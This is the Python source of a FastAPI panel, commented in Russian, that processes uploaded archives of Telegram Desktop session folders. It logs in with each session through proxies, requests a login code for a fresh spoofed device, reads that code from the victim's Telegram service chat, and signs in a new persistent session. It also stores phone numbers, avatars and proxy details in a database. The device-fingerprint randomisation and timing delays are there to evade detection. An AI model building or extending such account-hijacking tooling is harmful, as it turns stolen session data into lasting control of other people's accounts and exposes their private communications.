import os, uuid, zipfile, time, random, asyncio
from pathlib import Path
from fastapi import FastAPI, UploadFile, File, BackgroundTasks
from fastapi.middleware.cors import CORSMiddleware
from fastapi.staticfiles import StaticFiles
from fastapi.responses import FileResponse, JSONResponse
from pydantic import BaseModel
from sqlalchemy import create_engine, Column, String, Integer, DateTime, Boolean
from sqlalchemy.orm import declarative_base, sessionmaker
from datetime import datetime
from opentele2.td import TDesktop
from opentele2.api import API, UseCurrentSession
import aiohttp
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError

# --- Инициализация приложения ---
app = FastAPI()
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

# --- Конфиг путей ---
DATA_DIR = Path("/data")
SESS_DIR = DATA_DIR / "sessions"
UPLOAD_DIR = Path("/app/uploads")
STATIC_DIR = Path("/app/static")
SESS_DIR.mkdir(parents=True, exist_ok=True)
UPLOAD_DIR.mkdir(parents=True, exist_ok=True)
STATIC_DIR.mkdir(parents=True, exist_ok=True)

app.mount("/static", StaticFiles(directory=str(STATIC_DIR)), name="static")

# --- База данных ---
db_file = DATA_DIR / "twks.db"
engine = create_engine(f"sqlite:///{db_file}")
Base = declarative_base()
SessionDB = sessionmaker(bind=engine)

class Account(Base):
    __tablename__ = "accounts"
    id = Column(String, primary_key=True)
    user_id = Column(Integer, nullable=True)
    username = Column(String, nullable=True)
    first_name = Column(String, nullable=True)
    phone = Column(String, nullable=True)
    avatar_url = Column(String, nullable=True)
    device = Column(String)
    proxy = Column(String)
    proxy_country = Column(String, nullable=True)
    ip = Column(String, nullable=True)
    ping = Column(Integer, default=0)
    country = Column(String, nullable=True)
    country_code = Column(String, nullable=True)
    premium = Column(Boolean, default=False)
    status = Column(String, default="pending")
    error_msg = Column(String, nullable=True)
    created_at = Column(DateTime, default=datetime.utcnow)

class Proxy(Base):
    __tablename__ = "proxies"
    id = Column(Integer, primary_key=True, autoincrement=True)
    addr = Column(String)
    port = Column(Integer)
    username = Column(String, nullable=True)
    password = Column(String, nullable=True)
    proxy_type = Column(String, default="http")

Base.metadata.create_all(engine)

class ProxyList(BaseModel):
    text: str

def parse_proxy(line: str):
    line = line.strip().rstrip('/')
    if not line or line.startswith("#"): return None
    proxy_type = "http"
    if line.startswith("http://"): line = line.replace("http://", "")
    elif line.startswith("https://"): line = line.replace("https://", "")
    elif line.startswith("socks"): return None

    user = passw = None
    if "@" in line:
        auth, addr = line.split("@", 1)
        if ":" in auth: user, passw = auth.split(":", 1)
        host, port = addr.split(":")
    elif line.count(":") == 3: host, port, user, passw = line.split(":")
    elif line.count(":") == 1: host, port = line.split(":")
    else: return None

    port = ''.join(filter(str.isdigit, port))
    if not port: return None
    return {"proxy_type": proxy_type, "addr": host, "port": int(port), "username": user, "password": passw}

def pop_free_proxy(db):
    p = db.query(Proxy).order_by(Proxy.id.desc()).first()
    if not p: return None, None
    return p, {"proxy_type": p.proxy_type, "addr": p.addr, "port": p.port, "username": p.username, "password": p.password}

# --- Проверка IP, пинга и гео через прокси (Пункт 5) ---
async def get_proxy_info(proxy: dict):
    COUNTRY_RU = {
        "PT": "Португалия", "TR": "Турция", "RU": "Россия", "US": "США",
        "DE": "Германия", "GB": "Великобритания", "NL": "Нидерланды",
        "FR": "Франция", "UA": "Украина", "KZ": "Казахстан", "PL": "Польша",
        "ES": "Испания", "IT": "Италия", "CA": "Канада", "BR": "Бразилия",
        "IN": "Индия", "ID": "Индонезия", "VN": "Вьетнам", "AE": "ОАЭ",
    }
    proxy_url = f"http://{proxy['username']}:{proxy['password']}@{proxy['addr']}:{proxy['port']}" if proxy.get("username") else f"http://{proxy['addr']}:{proxy['port']}"
    start_time = time.time()
    try:
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=15)) as session:
            async with session.get("http://ip-api.com/json/?fields=status,country,countryCode,query", proxy=proxy_url) as response:
                data = await response.json()
                ping = int((time.time() - start_time) * 1000)
                if data.get("status") == "success":
                    code = data.get("countryCode")
                    return {"ip": data.get("query"), "country_code": code, "country": COUNTRY_RU.get(code, data.get("country"))}, ping
    except Exception:
        pass
    return {"ip": "N/A", "country_code": "UN", "country": "Неизвестно"}, 0

# --- Генерация уникального отпечатка устройства (Пункт 1) ---
def generate_random_device(acc_id: str):
    devices = [
        {"api": API.TelegramAndroid.Generate(unique_id=acc_id), "device_str": "Android 13.0 (Mobile)"},
        {"api": API.TelegramIOS.Generate(unique_id=acc_id), "device_str": "iOS 17.2 (Mobile)"},
    ]
    selected = random.choice(devices)
    return selected["api"], selected["device_str"]

def extract_tdata(zip_path: str) -> list:
    out = UPLOAD_DIR / uuid.uuid4().hex
    out.mkdir(parents=True, exist_ok=True)
    with zipfile.ZipFile(zip_path) as zf: zf.extractall(out)
    return [p for p in out.rglob("*") if p.is_dir() and ((p / "key_datas").exists() or any(f.name.isupper() and len(f.name) == 16 for f in p.glob("*")))]

# --- Новая логика: создание параллельной сессии через перехват кода ---
async def create_new_session_from_tdata(tdata_path: str, proxy_dict: dict, acc_id: str):
    # 1. Подключаемся к исходной tdata как старая сессия для чтения служебных сообщений
    old_session_file = SESS_DIR / f"{acc_id}_old.session"
    if old_session_file.exists(): old_session_file.unlink()

    tdesk = TDesktop(tdata_path)
    old_client = await tdesk.ToTelethon(str(old_session_file), UseCurrentSession)
    old_client._proxy = {'proxy_type': 'http', 'addr': proxy_dict['addr'], 'port': proxy_dict['port'], 'username': proxy_dict.get('username'), 'password': proxy_dict.get('password')}

    net_info, ping_ms = await get_proxy_info(proxy_dict)
    await old_client.connect()

    try:
        if not await old_client.is_user_authorized():
            return {"status": "invalid", "error_msg": "Исходная сессия не авторизована"}
        
        me = await old_client.get_me()
        phone = me.phone

        # 2. Создаем абсолютно новую параллельную сессию с уникальным девайсом (Пункт 1)
        new_session_file = SESS_DIR / f"{acc_id}.session"
        if new_session_file.exists(): new_session_file.unlink()

        chosen_api, device_string = generate_random_device(acc_id)
        new_client = TelegramClient(str(new_session_file), api_id=chosen_api.api_id, api_hash=chosen_api.api_hash)
        new_client._proxy = old_client._proxy
        
        # Настраиваем параметры отпечатка
        new_client.device_model = chosen_api.device_model
        new_client.system_version = chosen_api.system_version
        new_client.app_version = chosen_api.app_version

        await new_client.connect()

        # Запрашиваем код авторизации на новый девайс
        sent_code = await new_client.send_code_request(phone)
        
        # Ждем поступления кода в чат Telegram (777000) на старой сессии (максимум 30 секунд)
        code = None
        for _ in range(15):
            await asyncio.sleep(2)
            async for message in old_client.iter_messages(777000, limit=3):
                if message.text and any(char.isdigit() for char in message.text):
                    # Извлекаем цифры кода из текста сообщения
                    import re
                    digits = re.findall(r'\d+', message.text)
                    for d in digits:
                        if len(d) >= 5: # коды телеграма обычно от 5 цифр
                            code = d
                            break
                if code: break
            if code: break

        if not code:
            return {"status": "error", "error_msg": "Таймаут: код авторизации не поступил в чат 777000"}

        # Поведенческая задержка (Пункт 4)
        await asyncio.sleep(random.uniform(1.5, 3.0))

        try:
            await new_client.sign_in(phone=phone, code=code, phone_code_hash=sent_code.phone_code_hash)
        except SessionPasswordNeededError:
            # Если требуется облачный пароль 2FA (можно подставить дефолтный или запрашивать)
            return {"status": "error", "error_msg": "Требуется 2FA пароль (облачный пароль)"}

        # Проверяем успешность авторизации новой сессии
        new_me = await new_client.get_me()

        avatar_url = None
        if new_me.photo:
            avatar_path = STATIC_DIR / f"avatar_{acc_id}.jpg"
            await new_client.download_profile_photo(new_me, file=str(avatar_path))
            avatar_url = f"/static/avatar_{acc_id}.jpg"

        return {
            "status": "valid",
            "user_id": new_me.id,
            "username": new_me.username,
            "first_name": new_me.first_name,
            "phone": new_me.phone,
            "avatar_url": avatar_url,
            "device": device_string,
            "country": net_info["country"],
            "country_code": net_info["country_code"],
            "proxy_country": net_info["country"],
            "ip": net_info["ip"],
            "ping": ping_ms,
            "premium": getattr(new_me, "premium", False),
            "error_msg": None
        }

    except Exception as e:
        return {"status": "error", "error_msg": str(e)}
    finally:
        await old_client.disconnect()
        # Очищаем временную старую сессию
        if old_session_file.exists(): old_session_file.unlink()

async def process_zip(zip_path: str):
    dirs = extract_tdata(zip_path)
    db = SessionDB()
    existing_phones = {a.phone for a in db.query(Account).all() if a.phone}

    for td in dirs:
        acc_id = str(uuid.uuid4())
        _, proxy_dict = pop_free_proxy(db)
        if not proxy_dict:
            db.add(Account(id=acc_id, status="error", error_msg="Нет свободных прокси"))
            db.commit(); continue

        try:
            res = await create_new_session_from_tdata(td, proxy_dict, acc_id)
            if res.get("phone") and res["phone"] in existing_phones: continue
            if res.get("phone"): existing_phones.add(res["phone"])

            db.add(Account(
                id=acc_id, 
                user_id=res.get("user_id"), 
                username=res.get("username"),
                first_name=res.get("first_name"), 
                phone=res.get("phone"),
                avatar_url=res.get("avatar_url"), 
                device=res.get("device"),
                proxy=f"{proxy_dict['addr']}:{proxy_dict['port']}",
                proxy_country=res.get("proxy_country"), 
                ip=res.get("ip"), 
                ping=res.get("ping"),
                country=res.get("country"), 
                country_code=res.get("country_code"),
                premium=res.get("premium"), 
                status=res.get("status", "error"), 
                error_msg=res.get("error_msg")
            ))
        except Exception as e:
            db.add(Account(id=acc_id, status="error", proxy="direct", error_msg=str(e)))
        db.commit()
    db.close()

# --- Роуты панели ---
@app.get("/")
def root(): return FileResponse("index.html")

@app.post("/proxies-text")
async def upload_proxies_text(data: ProxyList):
    db = SessionDB()
    count = 0
    for line in data.text.splitlines():
        p = parse_proxy(line)
        if p:
            db.add(Proxy(addr=p["addr"], port=p["port"], username=p["username"], password=p["password"], proxy_type="http"))
            count += 1
    db.commit(); db.close()
    return {"status": "ok", "added": count}

@app.post("/upload")
async def upload(bg: BackgroundTasks, file: UploadFile = File(...)):
    dst = UPLOAD_DIR / f"{uuid.uuid4()}.zip"
    dst.write_bytes(await file.read())
    bg.add_task(process_zip, str(dst))
    return {"status": "accepted"}

@app.get("/accounts")
def list_accounts():
    db = SessionDB()
    rows = db.query(Account).all()
    accounts_data = []
    for r in rows:
        avatar_path = None
        if r.avatar_url:
            local_file = Path("/app") / r.avatar_url.lstrip("/")
            if local_file.exists():
                avatar_path = r.avatar_url
        accounts_data.append({
            "id": r.id, 
            "user_id": r.user_id, 
            "username": r.username, 
            "first_name": r.first_name,
            "phone": r.phone, 
            "avatar_url": avatar_path, 
            "device": r.device, 
            "proxy": r.proxy,
            "proxy_country": r.proxy_country, 
            "ip": r.ip, 
            "ping": r.ping, 
            "country": r.country,
            "country_code": r.country_code, 
            "premium": r.premium, 
            "status": r.status, 
            "error_msg": r.error_msg,
            "created_at": r.created_at.strftime("%Y-%m-%d %H:%M") if r.created_at else ""
        })
    db.close()
    return accounts_data

@app.delete("/accounts/{acc_id}")
def delete_account(acc_id: str):
    db = SessionDB()
    acc = db.query(Account).filter_by(id=acc_id).first()
    if acc:
        session_file = SESS_DIR / f"{acc_id}.session"
        if session_file.exists(): session_file.unlink()
        db.delete(acc)
        db.commit()
    db.close()
    return {"status": "deleted"}

if __name__ == "__main__":
    import uvicorn
    port = int(os.environ.get("PORT", 8000))
    uvicorn.run("main:app", host="0.0.0.0", port=port)
